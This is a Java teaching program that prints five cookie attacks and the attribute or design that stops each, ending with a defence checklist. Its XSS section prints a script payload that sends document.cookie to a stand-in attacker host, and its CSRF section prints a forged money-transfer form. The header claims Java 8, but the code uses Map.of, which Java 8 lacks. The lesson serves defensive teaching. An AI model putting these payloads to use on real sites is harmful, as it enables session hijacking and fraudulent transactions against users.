import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Cookie Attack Lab - Hijack, Forge, XSS-theft (Java 8)
 * -----------------------------------------------------
 * A guided tour of what goes wrong with naive cookies and which attribute
 * or design choice stops each attack:
 *
 *   1. EAVESDROP   - cookie sent over HTTP -> Secure attribute
 *   2. TAMPER      - client edits "role=user" -> HMAC signature (SignedCookieUtil)
 *   3. XSS THEFT   - script reads document.cookie -> HttpOnly
 *   4. CSRF        - cross-site form rides the cookie -> SameSite + CSRF token
 *   5. FIXATION    - attacker picks the id -> regenerate on login
 *
 * Run:  java CookieAttackLab
 */
public class CookieAttackLab {

    public static void main(String[] args) throws Exception {
        System.out.println("=== 1. Eavesdropping ===");
        String overHttp = "Set-Cookie: session=abc; Path=/";
        System.out.println(overHttp);
        System.out.println("   -> anyone on the wifi reads 'session=abc'");
        System.out.println("   FIX: Set-Cookie: session=abc; Path=/; Secure");
        System.out.println();

        System.out.println("=== 2. Tampering (plain value) ===");
        String plain = encode(Map.of("user", "sanjog", "role", "user"));
        System.out.println("Server issued : prefs=" + plain);
        String forged = new String(Base64.getUrlEncoder().withoutPadding()
                .encode("{\"user\":\"sanjog\",\"role\":\"admin\"}".getBytes()));
        System.out.println("Attacker sends: prefs=" + forged);
        System.out.println("   FIX: sign the payload (see SignedCookieUtil.java)");
        System.out.println();

        System.out.println("=== 3. XSS theft ===");
        System.out.println("<script>fetch('https://evil.io?c='+document.cookie)</script>");
        System.out.println("   document.cookie shows: session=abc; theme=dark");
        System.out.println("   FIX: HttpOnly hides session from JS:");
        System.out.println("        Set-Cookie: session=abc; HttpOnly; Path=/");
        System.out.println();

        System.out.println("=== 4. Cross-Site Request Forgery ===");
        System.out.println("<form action='https://bank.example/transfer' method='POST'>");
        System.out.println("  <input name=to value=attacker><input name=amount value=1000>");
        System.out.println("</form>  <!-- browser attaches bank.example cookies! -->");
        System.out.println("   FIX: Set-Cookie: session=abc; SameSite=Lax + one-time CSRF token");
        System.out.println("        (see CsrfTokenManager.java)");
        System.out.println();

        System.out.println("=== 5. Session fixation ===");
        System.out.println("Victim logs in with attacker's id s=ATTACKER123 ... server keeps it.");
        System.out.println("   FIX: invalidate old id, issue fresh UUID after every login");
        System.out.println("        (see SessionFixationDemo.java)");
        System.out.println();

        Map<String, String> checklist = new LinkedHashMap<>();
        checklist.put("Transport",     "Secure flag everywhere, HSTS on the domain");
        checklist.put("JS access",     "HttpOnly for any auth-related cookie");
        checklist.put("Cross-site",    "SameSite=Lax/Strict + synchronizer token");
        checklist.put("Integrity",     "HMAC-signed values or opaque server-side ids");
        checklist.put("Entropy",       ">=128-bit random ids (SecureRandom)");
        checklist.put("Rotation",      "new id on login / privilege change");
        checklist.put("Lifetime",      "short Max-Age; server idle timeout");
        System.out.println("Defense checklist:");
        checklist.forEach((k, v) -> System.out.println("  - " + k + ": " + v));
    }

    private static String encode(Map<String, String> data) {
        StringBuilder json = new StringBuilder("{");
        data.forEach((k, v) -> json.append('"').append(k).append("\":\"").append(v).append("\","));
        if (json.charAt(json.length() - 1) == ',') {
            json.setLength(json.length() - 1);
        }
        json.append("}");
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(json.toString().getBytes());
    }
}
